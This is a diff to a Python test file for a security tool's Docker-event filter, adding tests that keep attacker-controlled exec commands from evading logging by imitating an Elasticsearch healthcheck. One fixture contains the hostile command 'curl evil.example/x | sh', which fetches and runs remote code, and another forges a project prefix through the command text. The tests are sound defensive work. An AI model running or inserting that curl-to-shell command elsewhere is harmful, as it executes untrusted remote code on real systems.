@@ -28,11 +28,15 @@ HEALTHCHECK_ACTION = (
 )
 
 
-def _event(action, attributes=None, type_="container"):
+def _event(action, attributes=None, type_="container", compose=True):
+    """A Docker event. compose=False models a plain `docker run` container,
+    which carries no com.docker.compose.* labels at all."""
+    base = {"com.docker.compose.project": "kline"} if compose else {}
+    base.update(attributes or {})
     return {
         "status": action,
         "Type": type_,
-        "Actor": {"ID": "d57e1e8820da5d18", "Attributes": attributes or {}},
+        "Actor": {"ID": "d57e1e8820da5d18", "Attributes": base},
         "time": 1789916056,
         "timeNano": 1789916056299501306,
     }
@@ -150,7 +154,7 @@ def test_klines_own_containers_are_identifiable():
 
 
 def test_absent_compose_project_is_omitted_not_guessed():
-    ev = parse_docker_event(_event("start", {"name": "x"}))
+    ev = parse_docker_event(_event("start", {"name": "x"}, compose=False))
     assert "compose_project" not in ev.parsed
 
 
@@ -249,7 +253,10 @@ def test_the_correlation_map_cannot_grow_without_limit():
     # Dies that never arrive, far more than the cap.
     for i in range(_EXEC_MEMORY * 3):
         should_ingest(
-            _event(f"exec_start: {cmd}", {"name": "x", "execID": f"id-{i}"}),
+            _event(
+                f"exec_start: {cmd}",
+                {"name": "siem-elasticsearch", "execID": f"id-{i}"},
+            ),
             DEFAULT_DROP_PATTERNS,
             seen,
         )
@@ -257,6 +264,66 @@ def test_the_correlation_map_cannot_grow_without_limit():
 
 
 def test_correlation_is_optional():
-    """Without a map the command-matching half still works on its own."""
+    """Without a map the signature-matching half still works on its own."""
     cmd = "/bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
-    assert should_ingest(_event(f"exec_start: {cmd}", {"name": "x"}), DEFAULT_DROP_PATTERNS) is False
+    data = _event(f"exec_start: {cmd}", {"name": "siem-elasticsearch"})
+    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is False
+
+
+# ── the filter must not become an evasion vector ────────────────────────
+#
+# The first version of this pattern matched `exec_\w+: .*/_cluster/health`
+# anywhere in the signature. In a security tool that is a hole: the command
+# is attacker-controlled, so anything keyed only on command text lets a
+# container opt itself out of being logged.
+
+
+def test_an_unrelated_container_cannot_hide_behind_the_magic_string():
+    data = _event(
+        "exec_start: /bin/bash -c 'curl evil.example/x | sh' # /_cluster/health",
+        {"name": "immich-server", "com.docker.compose.project": "immich"},
+    )
+    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True
+
+
+def test_kline_s_own_container_cannot_hide_a_different_command_either():
+    data = _event(
+        "exec_start: /bin/bash # /_cluster/health",
+        {"name": "siem-elasticsearch"},
+    )
+    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True
+
+
+def test_another_projects_elasticsearch_healthcheck_is_kept():
+    """A second ES-backed stack runs an identical command; it is not ours."""
+    data = _event(
+        "exec_start: /bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1",
+        {"name": "graylog-elasticsearch", "com.docker.compose.project": "graylog"},
+    )
+    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True
+
+
+def test_a_container_cannot_forge_the_project_prefix_via_its_command():
+    """project and name come from Docker's labels, not from the command."""
+    data = _event(
+        "exec_start: kline siem-elasticsearch exec_start: /bin/sh -c "
+        "curl -f http://localhost:9200/_cluster/health || exit 1",
+        {"name": "attacker", "com.docker.compose.project": "other"},
+    )
+    assert should_ingest(data, DEFAULT_DROP_PATTERNS) is True
+
+
+# ── a bad pattern must not crash the collector ──────────────────────────
+
+
+def test_a_malformed_regex_is_logged_and_ignored_not_raised():
+    """Uncaught, it escapes to the per-connection handler, which tears down
+    and reopens the /events stream on every single event -- a crash loop."""
+    data = _event("start", {"name": "x"})
+    assert should_ingest(data, ["(unclosed"]) is True
+
+
+def test_a_malformed_regex_does_not_stop_later_valid_ones():
+    cmd = "/bin/sh -c curl -f http://localhost:9200/_cluster/health || exit 1"
+    data = _event(f"exec_start: {cmd}", {"name": "siem-elasticsearch"})
+    assert should_ingest(data, ["(unclosed", *DEFAULT_DROP_PATTERNS]) is False
